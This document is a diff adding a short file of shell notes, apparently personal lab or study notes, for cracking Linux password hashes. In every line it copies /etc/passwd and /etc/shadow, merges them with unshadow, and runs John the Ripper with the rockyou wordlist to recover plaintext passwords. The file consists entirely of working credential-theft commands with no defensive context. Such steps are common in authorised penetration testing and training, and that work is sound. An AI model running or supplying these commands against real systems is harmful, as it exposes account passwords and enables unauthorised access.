@@ -1,0 +1,12 @@
+cd /etc
+cat /etc/passwd > passwd.txt
+cat /etc/shadow > shadow.txt
+unshadow passwd.txt shadow.txt > hashtocrack.txt
+john
+have some wordlist
+/usr/share/wordlist
+head -n 50 rockyou.txt
+cat rockyou.txt |wc -l
+john --format=crypt --wordlist=rockyou.txt  hashtocrack.txt 
+john hashtocrack.txt --show
+
